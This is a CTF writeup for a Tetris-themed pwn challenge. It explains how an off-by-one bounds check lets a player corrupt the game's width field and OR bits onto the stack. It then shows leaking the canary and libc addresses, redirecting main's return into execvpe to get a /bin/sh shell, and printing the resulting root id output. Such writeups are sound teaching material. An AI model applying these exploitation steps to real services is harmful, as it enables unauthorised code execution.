# teto — BlackHat CTF quals writeup

> *"How many tetris pwn have you seen in CTFs?"*

A PIE + full-RELRO x86-64 tetris game served over TCP. Source (`teto.c`) provided.
No heap grooming, no ROP chain — the whole exploit is **one OR-bit at a time**,
and the hard part is budgeting how many bits you can afford to spend.

Files: `teto_exploit.py` (driver), `tetosim.py` (game reimplementation + planner).
Run with `python3 teto_exploit.py host:port`.

---

## 1. The bug

`set_cell()` guards `y` against `-1` instead of `0`:

```c
static void set_cell(Game *g, int x, int y) {
    if (x < 0) return;
    if (y < -1) return;                      // <-- -1 gets through
    if ((uint32_t)x >= g->width) return;
    if (y >= (int)g->height) return;

    int stride = (int)ROW_BYTES;             // hardcoded 2
    int idx = y * stride + (x >> 3);         // y == -1  =>  -2 + (x>>3)
    g->stage[idx] |= (uint8_t)(1u << (x & 7));
}
```

With the struct:

```c
typedef struct {
    uint32_t score;      // +0x00
    uint16_t height;     // +0x04
    uint16_t width;      // +0x06
    uint8_t  stage[40];  // +0x08
} Game;                  // 48 bytes, a local in play_session_live()
```

`stage` sits at `Game+8`, so `idx == -2` writes to `Game+6` — **the `width`
field**. And `width` is exactly what bounds `x` two lines earlier. The field
that stops the write is the field the write corrupts.

Inflate `width` and `idx = -2 + (x>>3)` walks forward off `Game` and straight up
the stack. Note it only ever ORs — you can set bits, never clear them. That
single fact shapes the entire exploit.

## 2. Getting a write to happen at y = -1

Pieces normally lock at `y >= 0`. The way in is `rotate_piece()`:

```c
int entry_kick = p->y < 0 && piece_tall(d) && top_pressure(g);
if (entry_kick) { table = tall_entry_kicks; ... }   // first entry is {0, -2}
...
if (entry_kick && table[i].dy < 0) return MOVE_LOCK;
```

and in `handle_live_key()`:

```c
case 'w': case KEY_UP:
    if (rotate_piece(g, p) == MOVE_LOCK) {
        lock_piece(g, p);        // no p->y >= 0 check anywhere
        locked = 1;
    }
```

Three conditions:

* `p->y < 0` — pieces spawn at `y = -2`, so you have ~1 s (two 500 ms fall ticks).
* `piece_tall(d)` — true only if the 4×4 has a cell in row 3. Checking every
  pattern, that is **only the vertical I** (`.#...#...#...#..`).
* `top_pressure(g)` — needs ≥ 60 occupied cells. It's sticky: once
  `ceiling_pressure` is set it never resets.

A vertical I kicked by `{0,-2}` from `y = -2` sits at `y = -4`, with cells at
`y = -4, -3, -2, -1`. `set_cell` rejects everything below `-1`, so **exactly one
cell writes**, at `x = p->x + 1`.

> **One I piece = one bit.** That is the entire primitive.

## 3. The formula

From the disassembly of `play_session_live` (`lea rax,[rbp-0x40]` → `game`,
canary at `rbp-0x8`) and `main` (`push rbp; sub rsp,0x10`, so
`main_rbp == psl_rbp + 0x20`):

| what | stage offset `S` |
|---|---|
| `width` itself | −2 |
| stack canary | 48 |
| `play_session_live` return (`main+0x25`) | 64 |
| `main`'s saved RBP | 88 |
| **`main`'s return into libc** | **96** |

Since `set_cell` writes bit `x & 7` of byte `Game + 6 + (x >> 3)`, to set bit `b`
of the 8-byte value at stage offset `S`:

```
p->x = 8 * (S + 2) + b - 1
```

For `S = -2` this degenerates to `x == b`, i.e. **x directly picks the width bit** —
very convenient. For the libc return it's `p->x = 783 + b`.

Movement that far right works because `collides()` bounds `x` by `g->width` while
the piece is above the board, and only by the hardcoded `WIDTH` (10) once
`y >= 0`:

```c
if (y < 0) { if ((uint32_t)x >= g->width) return 1; }
else if (x >= (int)WIDTH) return 1;
```

So you can walk a piece out to `x = 800` while it floats above the well.

## 4. The constraint that makes this a puzzle

```c
static void clear_row(Game *g, int y) {
    size_t stride = stride_bytes(g);                     // (width + 7) / 8
    memmove(base + stride, base, (size_t)y * stride);
    memset(base, 0, stride);
}
```

At `width == 10`, `stride == 2` and this is the intended row shift. The moment
`width > 16`, `stride != 2` and that `memmove` walks off `Game` and destroys the
canary and both return addresses.

**So after your first width write, no line may ever clear again** — and the board
fills up in ~45 pieces.

`rand()` is never seeded, so the piece order is fixed. Reproduce it with
`ctypes.CDLL("libc.so.6").rand() % 7`:

```
I pieces at: 15, 21, 31, 37, 43, 52, 69, 77, 79, 80, 83, 86, 93, 94, 99, 101, 103, ...
```

The early I pieces are 6–10 apart. Start inflating at piece 15 (the obvious move)
and you need ~55 non-I pieces × 4 cells = 220 cells against a ~180-cell budget —
you top out long before the write stage. **This is the trap.** Our first working
leak script died here.

The late I pieces bunch up. Delay the first rotate-lock to **piece 69** and you
get 11 usable I pieces (69, 77, 79, 80, 83, 86, 93, 94, 99, 101, 103) before the
board fills at ~piece 104. Everything before 69 plays normally at `width == 10`,
where clearing lines is perfectly safe and keeps the well low.

Budget: 2 pieces to reach `width 90` for the leak, 1 to reach `width 32858` for
reach, leaving **8 slots for 7 writes**.

`tetosim.py` reimplements the game logic exactly (including `clear_lines`' quirky
forward scan) and drives an El-Tetris placement search, so the driver always knows
the true board state. It also refuses any placement that would complete a row —
that, not "keep column 9 empty", is what guarantees `clear_lines()` stays a no-op.

## 5. The leak

`draw_live()` reads the board through `get_cell()`, which uses
`stride_bytes(g)` — the *inflated* stride — while `usable_cols` is capped at 80.
Pick the width so the rendered rows line up on whole bytes:

* piece 69: `p->x = 5` → sets width bit 6 → `width = 10 | 64 = 74`
* piece 77: `p->x = 3` → sets width bit 4 → `width = 74 | 16 = 90`

At `width == 90`, `stride == 12` and 80 columns = **10 whole bytes per row**, so
row `y` prints `stage[12y .. 12y+9]` as `#`/`.`. Offset 96 lands at row 8, bytes
0–7 — the entire libc return, cleanly readable. Offset 48 (canary) is row 4.

```
canary    = 0xc5fff7d36bdeeb00   (ends in 00 — sane)
PIE base  = 0x00005641bd1b8000   (page aligned — sane)
main rbp  = 0x00007fff5a41cdc0
main ret  = 0x00007faa53a2a1ca   ->  libc base 0x00007faa53a00000
```

Two free self-checks: a glibc canary always ends in `0x00`, and
`psl_ret - 0x2e69` must be page-aligned.

## 6. Picking a target

We can only OR, so a target `T` must be a **bitwise superset** of the current
return `A`, and every differing bit costs one I piece.

`A = libc + 0x2a1ca` (inside `__libc_start_call_main`). Enumerating every
offset `⊇ 0x2a1ca` within `[0, 0x200000)` and ranking by popcount finds:

```
T = libc + 0xef3ea   =   execvpe+0x42a   —   6 bits: {5, 9, 12, 14, 18, 19}
```

which sits inside `execvpe`'s exec path:

```
ef409:  lea    r11,[rip+0xdc01f]        # "/bin/sh"
ef41b:  mov    QWORD PTR [rdx*8+0x0],r11
ef423:  mov    QWORD PTR [rdx*8+0x8],rdi
ef443:  call   execve
```

Plus one bit into `main`'s saved RBP (bit 3 at `S = 88`, i.e. `p->x = 722`) to
nudge the frame by 8 for `execvpe`'s stack layout. Seven writes total.

Because we *leak*, we don't depend on libc being 2 MiB-aligned — the bits are
computed from the observed value. (A no-leak variant works when the base happens
to be 2 MiB-aligned, since both offsets are < 0x200000, but it needs several
ASLR attempts.)

## 7. Reach, without crashing the renderer

To write `p->x = 803` (bit 20 of the return) you need `width > 803`. The obvious
route is `90 → 602 → 1626`. **That crashed on the remote**, and it's the most
interesting bug in the exploit itself:

```c
int readable = (size_t)y * stride_bytes(g) < VIEW_READ_BYTES;   // 4096
```

| width | stride | readable rows | max read |
|---|---|---|---|
| 90 | 12 | 20 | `stage+237` |
| 602 | 76 | 20 | `stage+1453` — survived |
| 1626 | 204 | 20 | `stage+3885` — **SIGSEGV** |
| **32858** | **4108** | **1** | **`stage+9`** |

`draw_live` reads `stage[y*stride + 9]` for 20 rows. At `width 1626` that's
3.8 KB past `stage`, off the top of the stack. Locally it survives because the
environment is large; under pwn.red/jail the env is tiny, so there's far less
stack above `main`'s frame.

The fix is to lean on `readable`: pick a stride ≥ 4096 and *only row 0* renders.
`90 | 0x8000 = 32858` gets there in **one** bit (`p->x = 14`), gives stride 4108,
and eliminates the out-of-bounds read entirely rather than just shrinking it. It
also frees an I piece.

## 8. Driving it over the network

Two gotchas, both stale-frame problems invisible locally:

**Timing on the rotate-lock.** The write must land while `p->y < 0`, i.e. within
one 500 ms fall tick of spawn. The driver concatenates each special piece's keys
onto the *previous* piece's `send()`, so they're already in the socket buffer when
the I spawns — round-trip time can't cost you the write.

**Frame synchronisation.** Fixed sleeps desync. `send_sync()` sends, then blocks
until the *rendered board matches the simulator*. A late frame from the previous
step can't be mistaken for the current one, because it won't match the new board —
the loop just keeps waiting. Also, `@` (the active piece) is treated as empty,
since it isn't part of the board yet; otherwise a fall tick rendering the next
piece descending into view would stall the sync forever.

## 9. Chain summary

```
pieces  0–57   play normally, clearing lines      (width 10, stride 2 — safe)
pieces 58–68   stack without clearing to ≥60 cells (arms ceiling_pressure)
piece  69      p->x=5   width bit 6   -> width 74
piece  77      p->x=3   width bit 4   -> width 90     <- LEAK canary/PIE/libc
piece  79      p->x=14  width bit 15  -> width 32858  <- reach, no OOB read
pieces 80–101  p->x=783+b   OR 6 bits into main's saved return
               p->x=722     OR bit 3 into main's saved RBP
               walk a piece past x=10 above the board -> deliberate top-out
main returns into execvpe -> execve("/bin/sh") on the inherited socket
```

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## 10. Takeaways

* A bounds check on a field the write itself corrupts is a lovely bug class.
  Always ask *where does the bound live?*
* When the target has deterministic state, reimplement it. Mirroring the game in
  Python and diffing against the rendered frame every step turned blind poking
  into something verifiable, and caught the remote desync instantly instead of
  silently corrupting the write stage.
* With an OR-only primitive, the target set is "bitwise supersets of the current
  value" — enumerate and rank by popcount rather than reaching for a known gadget.
* Budget your primitive before you spend it. The real difficulty here wasn't
  finding the bug; it was noticing that inflating `width` costs you line clears,
  and therefore the board, and therefore your remaining writes.
